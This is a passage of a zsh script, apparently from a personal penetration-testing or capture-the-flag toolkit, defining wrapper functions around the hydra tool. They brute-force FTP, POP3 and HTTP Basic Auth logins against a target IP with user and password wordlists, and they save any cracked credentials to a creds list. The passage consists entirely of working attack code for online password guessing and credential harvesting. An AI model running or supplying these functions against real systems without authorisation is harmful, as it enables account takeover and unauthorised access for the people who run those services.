        port="${1#-p}"
        shift
        ;;
      -p)
        port="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -h|--help)
        _hydraftp-usage
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  _hydra-parse-args anonymous "${args[@]}" || {
    _hydraftp-usage >&2
    return 1
  }

  _hydra-run-service ftp "$_HYDRA_TARGET" "$_HYDRA_USER" "$_HYDRA_WORDLIST" "$threads" hydraftp "$port"
}

# usage: hydrapop3 [target] -L users.txt -P passes.txt
#        hydrapop3 [target] <user> [wordlist]   (single user, like hydrassh)
hydrapop3() {
  local target="" userfile="" passfile="" threads=16
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -L)
        userfile="$2"
        shift 2
        ;;
      -P)
        passfile="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -h|--help)
        echo "usage: hydrapop3 [target] -L users.txt -P passes.txt"
        echo "       hydrapop3 [target] <user> [wordlist]"
        echo "  hits saved to creds-list via creds-import-hydra"
        echo "  examples:"
        echo "    hydrapop3 -L users.txt -P passes.txt"
        echo "    hydrapop3 seina \$RECON_PASSLIST"
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  if [[ -n "$userfile" && -n "$passfile" ]]; then
    target="${args[1]:-${IP:-}}"
    [[ -z "$target" ]] && {
      echo "[-] no target ip — target-set <ip> first" >&2
      return 1
    }
    [[ -f "$userfile" && -f "$passfile" ]] || {
      echo "[-] userlist or passlist not found" >&2
      return 1
    }
    echo "[*] target: pop3://$target  -L ${userfile:t}  -P ${passfile:t}" >&2
    local log rc
    log="$(mktemp "${TMPDIR:-/tmp}/hydrapop3.XXXXXX")"
    trap 'rm -f "$log"' EXIT INT TERM
    hydra -L "$userfile" -P "$passfile" -t "$threads" -f -V \
      "$target" pop3 2>&1 | tee "$log"
    rc=${pipestatus[1]}
    python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"
    return $rc
  fi

  _hydra-parse-args "" "${args[@]}" || {
    echo "usage: hydrapop3 [target] -L users.txt -P passes.txt" >&2
    echo "       hydrapop3 [target] <user> [wordlist]" >&2
    return 1
  }

  _hydra-run-service pop3 "$_HYDRA_TARGET" "$_HYDRA_USER" "$_HYDRA_WORDLIST" "$threads" hydrapop3
}

_hydra-run-http-get() {
  local target="$1"
  local user="$2"
  local wordlist="$3"
  local threads="$4"
  local log_prefix="$5"
  local port="$6"
  local url_path="$7"
  local user_flag="$8"   # -l or -L
  local user_arg="$9"

  url_path="${url_path:-/}"
  [[ "$url_path" != /* ]] && url_path="/${url_path}"

  if [[ ! -f "$wordlist" ]]; then
    echo "wordlist not found: $wordlist"
    return 1
  fi

  local target_label="http://${target}${port:+:$port}${url_path}"
  if [[ "$user_flag" == -L ]]; then
    echo "[*] target: $target_label  -L ${user_arg:t}"
  else
    echo "[*] target: $target_label  user: $user"
  fi
  echo "[*] wordlist: $wordlist"

  local log rc
  log="$(mktemp "${TMPDIR:-/tmp}/${log_prefix}.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  local -a hydra_cmd=(hydra "$user_flag" "$user_arg" -P "$wordlist" -t "$threads" -f -V)
  [[ -n "$port" ]] && hydra_cmd+=(-s "$port")
  hydra_cmd+=("$target" http-get "$url_path")

  "${hydra_cmd[@]}" 2>&1 | tee "$log"
  rc=${pipestatus[1]}

  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"

  return $rc
}

_hydrabasic-usage() {
  echo "usage: hydrabasic [-p port] [target] <user> [path] [wordlist]"
  echo "       hydrabasic [-p port] [target] -L users.txt [-P wordlist] [path]"
  echo "  HTTP Basic Auth (hydra http-get)"
  echo "  default path: /   default wordlist: \$RECON_PASSLIST"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydrabasic barry"
  echo "  hydrabasic barry /admin/"
  echo "  hydrabasic -p 8080 barry /protected/ ./wordlist.txt"
  echo "  hydrabasic -L users.txt -P passes.txt /"
}

hydrabasic() {
  local port="" threads=16
  local userfile="" passfile="" url_path="/"
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p[0-9]*)
        port="${1#-p}"
        shift
        ;;
      -p)
        port="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -L)
        userfile="$2"
        shift 2
        ;;
      -P)
        passfile="$2"
        shift 2
        ;;
      -h|--help)
        _hydrabasic-usage
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  if [[ -n "$userfile" ]]; then
    local target="${args[1]:-${IP:-}}"
    [[ -z "$target" ]] && {
      echo "[-] no target ip — target-set <ip> first" >&2
      _hydrabasic-usage >&2
      return 1
    }
    [[ -f "$userfile" ]] || {
      echo "[-] userlist not found: $userfile" >&2
      return 1
    }
    passfile="${passfile:-$RECON_PASSLIST}"
    if [[ ${#args[@]} -ge 1 ]] && _recon-looks-like-host "${args[1]}"; then
      target="${args[1]}"
      [[ ${#args[@]} -ge 2 && "${args[2]}" == /* ]] && url_path="${args[2]}"
    elif [[ ${#args[@]} -ge 1 && "${args[1]}" == /* ]]; then
      url_path="${args[1]}"
    fi
    _hydra-run-http-get "$target" "" "$passfile" "$threads" hydrabasic "$port" "$url_path" -L "$userfile"
    return $?
  fi

  local wordlist="$RECON_PASSLIST"
  if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
    wordlist="${args[-1]:A}"
    if (( ${#args[@]} > 1 )); then
      args=("${args[1,-2]}")
    else
      args=()
    fi
  fi

  local target="" user=""
  if [[ ${#args[@]} -ge 2 ]] && _recon-looks-like-host "${args[1]}"; then
    target="${args[1]}"
    user="${args[2]}"
    args=("${args[3,-1]}")
  elif [[ ${#args[@]} -ge 1 ]]; then
    target="${IP:-}"
    user="${args[1]}"
    args=("${args[2,-1]}")
  else
    _hydrabasic-usage >&2
    return 1
  fi

  [[ -n "$target" && -n "$user" ]] || {
    echo "[-] need target and user (target-set <ip> or pass IP)" >&2
    _hydrabasic-usage >&2
    return 1
  }

  if [[ ${#args[@]} -ge 1 && "${args[1]}" == /* ]]; then
    url_path="${args[1]}"
  fi

  _hydra-run-http-get "$target" "$user" "$wordlist" "$threads" hydrabasic "$port" "$url_path" -l "$user"
}
